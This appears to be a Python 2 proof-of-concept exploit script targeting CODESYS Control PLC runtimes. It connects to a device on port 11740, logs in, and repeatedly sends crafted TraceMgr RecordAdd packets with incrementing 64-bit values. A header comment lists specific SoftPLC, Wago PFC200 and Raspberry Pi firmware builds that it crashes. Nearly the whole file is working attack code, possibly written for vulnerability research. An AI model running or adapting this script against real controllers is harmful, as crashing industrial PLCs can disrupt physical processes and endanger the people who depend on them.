#! /usr/bin/env python2
import os
import sys
from os import urandom
from struct import pack

sys.path.append("..")
from lib import pycodesys
from lib.layers import layer7, parse_tags_to_dict, s_tag
from lib.utils import pretty_format_tagsdict

'''
TraceMgr 0x0f RecordAdd 0x0d
Tested on following:

# Crashes:
    SoftPLC CODESYS Control V3.5.16.40 for x86-32Bit - build Apr 19 2021
    Wago PFC200 03.00.39(FW12) CODESYS Control V3.5.16.20 for ARM-32Bit - build Dec  2 2020
    RPI3 B+: CODESYS Control V3.5.17.10 for ARM-32Bit - build Aug 27 2021 (with CmpUserMgr.SECURITY.UserMgmtEnforce=NO)
    RPI3 B+ CODESYS Control V3.5.16.20 for ARM-32Bit - build Dec  2 2020 (both singlecore armv6l and multicore armv7l)
    Shneider: ?
# Ignored: 
    ODROID CU-2 CODESYS Control V3.5.17.10 for ARM-64Bit - build Aug 27 2021
    SoftPLC CODESYS Control V3.5.16.20 for x86-64Bit - build Dec  2 2020
    
No loaded Application or trace object required
Works even with no trace object in the loaded application
'''

cds = pycodesys.CodesysNode(host=sys.argv[1], port=11740, verbose=True)
chan_id = cds.connect()

# Login to Device
cds.loginToDevice()

# List loaded applications
# appname = cds.readAppList()
# print(appname)
#
# cds.loginToApp(appname)

# Payload
# tagdata = "\x40\x84\x80\x00\x19\x00\x00\x00\x84\x01\x88\x01\x21\x84\x80\x00" \
# "\x01\x02\x00\x00\x4e\x84\x80\x00\x05\x00\x00\x00\x4d\x88\x80\x00" \
# "\x02\x02\x10\x06\x00\x00\x00\x00\x20\x90\x80\x00\x50\x4c\x43\x5f" \
# "\x50\x52\x47\x2e\x69\x6e\x70\x75\x74\x00\x00\x00\x25\x84\x80\x00" \
# "\x03\x00\x00\x00\x26\x84\x80\x00\x02\x00\x00\x00\x27\x84\x80\x00" \
# "\x01\x00\x00\x00\x28\x84\x80\x00\xff\x00\x00\xff\x32\x84\x80\x00" \
# "\x00\x00\x00\x00\x35\x84\x80\x00\x00\x00\x00\x00\x38\x84\x80\x00" \
# "\x00\x00\x00\x00\x33\x84\x80\x00\x00\x00\x00\x00\x34\x84\x80\x00" \
# "\x00\x00\x00\xff\x36\x84\x80\x00\x00\x00\x00\x00\x37\x84\x80\x00" \
# "\x00\x00\xff\xff"

# 25 type: int 3 string 10 ustring 11
tag_84_contains = \
    "\x21\x84\x80\x00\x01\x02\x00\x00"\
    + s_tag(0x4e,"\x05\x00\x00\x00")\
    + s_tag(0x4d,"\x02\x02\x10\x06\x00\x00\x00\x00")\
    + s_tag(0x20,"\x50\x4c\x43\x5f\x50\x52\x47\x2e\x69\x6e\x70\x75\x74\x00\x00\x00") \
    + s_tag(0x25, "\x02\x00\x00\x00") \
    + s_tag(0x26, "\x02\x00\x00\x00") \
    +"\x27\x84\x80\x00" \
"\x01\x00\x00\x00\x28\x84\x80\x00\xff\x00\x00\xff\x32\x84\x80\x00" \
"\x00\x00\x00\x00\x35\x84\x80\x00\x00\x00\x00\x00\x38\x84\x80\x00" \
"\x00\x00\x00\x00\x33\x84\x80\x00\x00\x00\x00\x00\x34\x84\x80\x00" \
"\x00\x00\x00\xff\x36\x84\x80\x00\x00\x00\x00\x00\x37\x84\x80\x00" \
"\x00\x00\xff\xff"
#tagdata = s_tag(0x40, "\x19\x00\x00\x00")+s_tag(0x84, tag_84_contains)
#tagdata = s_tag(0x40, "\x38\x8b\xb8\x56")+s_tag(0x84, tag_84_contains)
#tagdata = s_tag(0x40, "\x00\x00\x00\x00")+s_tag(0x84, tag_84_contains)
#tagdata = s_tag(0x40, "\xFF\xFF\xFF\xFF")+s_tag(0x84, tag_84_contains)
#tagdata = s_tag(0x40, "\xEF\xBE\xAD\xDE")+s_tag(0x84, tag_84_contains)
#while True:
#payload = "\x19\x00\x00\x00"

payload = 0x00ACCADD
while True:
    #payload = os.urandom(8)

    print('payload: '+ str(payload))
    tagdata = s_tag(0x40, pack("<q", payload))+s_tag(0x84, tag_84_contains)

    cds.send_layer7(layer7(service_group=0x0f, command_id=0x0d, sess_id=cds.sess_id, data=tagdata))
    tags = cds.recv_layer7()
    payload += 400096
    if 0xff7f in tags:
        print('got 0xff7f')
    else:
        print (tags)
        cds.disconnect()


cds.disconnect()


#7FFFF6D3CAAC00
#0FFFFFFFFFFFFFFFF





